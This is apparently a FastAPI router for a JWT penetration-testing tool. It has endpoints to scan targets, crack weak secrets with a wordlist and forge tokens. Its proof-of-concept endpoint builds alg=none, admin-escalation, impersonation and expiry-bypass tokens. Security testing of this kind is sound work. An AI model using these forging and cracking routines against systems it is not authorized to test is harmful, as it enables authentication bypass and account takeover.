"""
JWT Attack Router

API endpoints for JWT security testing and attack simulation.
"""

import logging
from typing import Any, Dict, List, Optional

from fastapi import APIRouter, HTTPException
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, Field
from sse_starlette.sse import EventSourceResponse
import json

from backend.services.jwt_attack_service import (
    scan_jwt,
    analyze_jwt_token,
    forge_jwt_token,
    get_jwt_attack_types,
    JWTAttackType,
    COMMON_JWT_SECRETS,
)

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/jwt-security", tags=["jwt-security"])


# =============================================================================
# REQUEST/RESPONSE MODELS
# =============================================================================

class AnalyzeJWTRequest(BaseModel):
    """Request to analyze a JWT token."""
    token: str = Field(..., description="The JWT token to analyze")


class ScanJWTRequest(BaseModel):
    """Request to scan a JWT for vulnerabilities."""
    token: str = Field(..., description="The JWT token to test")
    target_url: str = Field(..., description="URL to send test requests to")
    token_location: str = Field(
        default="header",
        description="Where to send the token: header, cookie, or body"
    )
    token_name: str = Field(
        default="Authorization",
        description="Header or cookie name for the token"
    )
    token_prefix: str = Field(
        default="Bearer ",
        description="Prefix before the token (e.g., 'Bearer ')"
    )
    http_method: str = Field(
        default="GET",
        description="HTTP method to use for requests"
    )
    attacks: Optional[List[str]] = Field(
        default=None,
        description="Specific attacks to perform (null for all)"
    )
    custom_secrets: Optional[List[str]] = Field(
        default=None,
        description="Additional secrets to try for cracking"
    )
    jku_callback_url: Optional[str] = Field(
        default=None,
        description="Callback URL for JKU injection testing"
    )
    success_indicators: Optional[List[str]] = Field(
        default=None,
        description="Strings indicating successful authentication"
    )
    failure_indicators: Optional[List[str]] = Field(
        default=None,
        description="Strings indicating failed authentication"
    )
    additional_headers: Optional[Dict[str, str]] = Field(
        default=None,
        description="Additional headers to include in requests"
    )


class ForgeJWTRequest(BaseModel):
    """Request to forge a modified JWT."""
    original_token: str = Field(..., description="Original JWT to modify")
    payload_modifications: Optional[Dict[str, Any]] = Field(
        default=None,
        description="Changes to apply to the payload"
    )
    header_modifications: Optional[Dict[str, Any]] = Field(
        default=None,
        description="Changes to apply to the header"
    )
    secret: Optional[str] = Field(
        default=None,
        description="Secret for signing (required for HS algorithms)"
    )
    algorithm: str = Field(
        default="none",
        description="Algorithm for signing (none, HS256, HS384, HS512)"
    )


class QuickTestRequest(BaseModel):
    """Request for quick JWT vulnerability test."""
    token: str = Field(..., description="JWT token to test")
    target_url: str = Field(..., description="Target URL")


# =============================================================================
# ENDPOINTS
# =============================================================================

@router.post("/analyze")
async def analyze_token(request: AnalyzeJWTRequest) -> Dict[str, Any]:
    """
    Analyze a JWT token structure and identify potential issues.
    
    This performs static analysis without making any network requests.
    Returns header, payload, claims analysis, and security issues.
    """
    try:
        analysis = analyze_jwt_token(request.token)
        return {
            "success": True,
            "analysis": analysis,
        }
    except Exception as e:
        logger.error(f"JWT analysis failed: {e}")
        raise HTTPException(status_code=400, detail=str(e))


@router.post("/scan")
async def scan_token(request: ScanJWTRequest):
    """
    Perform comprehensive JWT security scan.
    
    Tests for various JWT vulnerabilities:
    - Algorithm none attack
    - Signature stripping
    - Weak secret cracking
    - Key confusion (RS256 to HS256)
    - Claim tampering
    - Expiration bypass
    - KID injection
    - JKU injection
    - Embedded JWK attack
    - Audience bypass
    
    Returns Server-Sent Events (SSE) stream with progress and results.
    """
    async def event_generator():
        try:
            async for event in scan_jwt(
                token=request.token,
                target_url=request.target_url,
                token_location=request.token_location,
                token_name=request.token_name,
                token_prefix=request.token_prefix,
                http_method=request.http_method,
                attacks=request.attacks,
                custom_secrets=request.custom_secrets,
                jku_callback_url=request.jku_callback_url,
                success_indicators=request.success_indicators,
                failure_indicators=request.failure_indicators,
            ):
                yield {
                    "event": event.get("type", "message"),
                    "data": json.dumps(event),
                }
        except Exception as e:
            logger.error(f"JWT scan failed: {e}")
            yield {
                "event": "error",
                "data": json.dumps({"error": str(e)}),
            }
    
    return EventSourceResponse(event_generator())


@router.post("/forge")
async def forge_token(request: ForgeJWTRequest) -> Dict[str, Any]:
    """
    Forge a modified JWT token.
    
    Create a new JWT with modified header/payload.
    Useful for testing and proof-of-concept generation.
    
    WARNING: Only use for authorized security testing.
    """
    try:
        forged = forge_jwt_token(
            original_token=request.original_token,
            payload_modifications=request.payload_modifications,
            header_modifications=request.header_modifications,
            secret=request.secret,
            algorithm=request.algorithm,
        )
        
        if not forged:
            raise HTTPException(status_code=400, detail="Failed to parse original token")
        
        # Also return analysis of forged token
        analysis = analyze_jwt_token(forged)
        
        return {
            "success": True,
            "forged_token": forged,
            "analysis": analysis,
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"JWT forging failed: {e}")
        raise HTTPException(status_code=400, detail=str(e))


@router.get("/attacks")
async def list_attack_types() -> Dict[str, Any]:
    """
    List available JWT attack types.
    
    Returns all supported attack types with descriptions.
    """
    attacks = get_jwt_attack_types()
    
    descriptions = {
        "alg_none": "Test if server accepts tokens with algorithm 'none' (no signature required)",
        "alg_confusion": "Test algorithm confusion (e.g., RS256 to HS256)",
        "signature_strip": "Test if server accepts tokens with empty or invalid signatures",
        "weak_secret": "Attempt to crack weak HMAC secrets using common passwords",
        "key_confusion": "Test key confusion attack (use public key as HMAC secret)",
        "claim_tampering": "Test if tampered claims are accepted (privilege escalation)",
        "exp_bypass": "Test if expired tokens are accepted",
        "jku_injection": "Test JKU (JSON Web Key Set URL) injection for SSRF",
        "jwk_injection": "Test JWK header injection",
        "kid_injection": "Test KID header injection (SQL injection, path traversal, etc.)",
        "kid_sql_injection": "Test SQL injection via KID header",
        "kid_path_traversal": "Test path traversal via KID header",
        "x5u_injection": "Test X5U header injection for SSRF",
        "token_replay": "Test token replay attacks",
        "audience_bypass": "Test if audience claim is properly validated",
        "issuer_spoof": "Test if issuer claim is properly validated",
        "embedded_jwk": "Test if server trusts embedded JWK in token header",
        "cve_2022_21449": "Test for Java ECDSA psychic signatures vulnerability",
    }
    
    return {
        "attacks": [
            {
                **attack,
                "description": descriptions.get(attack["value"], ""),
            }
            for attack in attacks
        ],
        "count": len(attacks),
    }


@router.post("/quick-test")
async def quick_vulnerability_test(request: QuickTestRequest) -> Dict[str, Any]:
    """
    Perform quick JWT vulnerability check.
    
    Runs the most critical tests:
    - Algorithm none
    - Signature stripping
    - Weak secret (limited wordlist)
    
    Returns immediate results without SSE streaming.
    """
    from services.jwt_attack_service import JWTScanner, JWTScanConfig, JWTAttackType
    
    config = JWTScanConfig(
        target_url=request.target_url,
        max_secrets_to_try=50,  # Reduced for quick test
    )
    
    quick_attacks = [
        JWTAttackType.ALG_NONE,
        JWTAttackType.SIGNATURE_STRIP,
        JWTAttackType.WEAK_SECRET,
    ]
    
    scanner = JWTScanner(config)
    results = []
    
    async for event in scanner.scan(request.token, quick_attacks):
        if event.get("type") == "vulnerability_found":
            results.append(event.get("result"))
        elif event.get("type") == "scan_complete":
            return {
                "success": True,
                "vulnerabilities_found": len(results),
                "vulnerabilities": results,
                "scan_result": event.get("result"),
            }
    
    return {
        "success": True,
        "vulnerabilities_found": len(results),
        "vulnerabilities": results,
    }


@router.get("/wordlist")
async def get_secret_wordlist(
    limit: int = 100,
    include_common: bool = True,
) -> Dict[str, Any]:
    """
    Get the built-in JWT secret wordlist.
    
    Returns common weak secrets used for JWT cracking.
    """
    wordlist = COMMON_JWT_SECRETS[:limit] if include_common else []
    
    return {
        "wordlist": wordlist,
        "count": len(wordlist),
        "total_available": len(COMMON_JWT_SECRETS),
    }


@router.post("/decode")
async def decode_token(request: AnalyzeJWTRequest) -> Dict[str, Any]:
    """
    Decode a JWT token without validation.
    
    Simple endpoint to view JWT contents.
    No signature verification is performed.
    """
    from services.jwt_attack_service import parse_jwt
    
    jwt = parse_jwt(request.token)
    if not jwt:
        raise HTTPException(status_code=400, detail="Invalid JWT format")
    
    return {
        "header": jwt.header,
        "payload": jwt.payload,
        "signature_present": bool(jwt.raw_signature),
        "signature_length": len(jwt.signature),
    }


@router.post("/generate-poc")
async def generate_proof_of_concept(
    vulnerability_type: str,
    original_token: str,
    cracked_secret: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Generate proof-of-concept tokens for identified vulnerabilities.
    
    Creates modified tokens demonstrating the vulnerability.
    """
    from services.jwt_attack_service import parse_jwt, create_jwt
    
    jwt = parse_jwt(original_token)
    if not jwt:
        raise HTTPException(status_code=400, detail="Invalid JWT format")
    
    poc_tokens = []
    
    if vulnerability_type == "alg_none":
        # Generate alg=none tokens
        for variant in ["none", "None", "NONE"]:
            new_header = {**jwt.header, "alg": variant}
            from services.jwt_attack_service import base64url_encode
            header_b64 = base64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
            poc_tokens.append({
                "description": f"Token with alg={variant}",
                "token": f"{header_b64}.{jwt.raw_payload}.",
            })
    
    elif vulnerability_type == "weak_secret" and cracked_secret:
        # Generate admin escalation tokens
        admin_payload = {**jwt.payload, "admin": True, "role": "admin"}
        poc_tokens.append({
            "description": "Admin privilege escalation",
            "token": create_jwt(jwt.header, admin_payload, cracked_secret, jwt.header.get("alg", "HS256")),
        })
        
        # Generate user impersonation token
        if "sub" in jwt.payload:
            impersonate_payload = {**jwt.payload, "sub": "admin"}
            poc_tokens.append({
                "description": "User impersonation (admin)",
                "token": create_jwt(jwt.header, impersonate_payload, cracked_secret, jwt.header.get("alg", "HS256")),
            })
    
    elif vulnerability_type == "exp_bypass":
        # Token with far future expiration
        from services.jwt_attack_service import base64url_encode
        import time
        far_future = int(time.time()) + (365 * 24 * 60 * 60 * 10)  # 10 years
        new_payload = {**jwt.payload, "exp": far_future}
        payload_b64 = base64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
        poc_tokens.append({
            "description": "Token with 10-year expiration",
            "token": f"{jwt.raw_header}.{payload_b64}.{jwt.raw_signature}",
        })
    
    return {
        "vulnerability_type": vulnerability_type,
        "poc_tokens": poc_tokens,
        "warning": "These tokens are for authorized security testing only",
    }


@router.get("/common-claims")
async def get_common_claims() -> Dict[str, Any]:
    """
    Get information about common JWT claims.
    
    Returns standard claims and their purposes.
    """
    return {
        "registered_claims": {
            "iss": "Issuer - identifies the principal that issued the JWT",
            "sub": "Subject - identifies the principal that is the subject of the JWT",
            "aud": "Audience - identifies the recipients that the JWT is intended for",
            "exp": "Expiration Time - identifies the expiration time after which the JWT must not be accepted",
            "nbf": "Not Before - identifies the time before which the JWT must not be accepted",
            "iat": "Issued At - identifies the time at which the JWT was issued",
            "jti": "JWT ID - provides a unique identifier for the JWT",
        },
        "common_custom_claims": {
            "name": "Full name of the user",
            "email": "Email address",
            "role": "User role(s)",
            "roles": "Array of user roles",
            "admin": "Boolean admin flag",
            "permissions": "Array of permissions",
            "scope": "OAuth2 scopes",
            "groups": "Group memberships",
        },
        "header_fields": {
            "alg": "Algorithm used for signing",
            "typ": "Type of token (usually 'JWT')",
            "kid": "Key ID - identifies which key was used to sign",
            "jku": "JWK Set URL - URL to retrieve the signing key",
            "jwk": "JSON Web Key - embedded key for verification",
            "x5u": "X.509 URL - URL to retrieve the certificate",
            "x5c": "X.509 Certificate Chain - embedded certificate(s)",
        },
    }
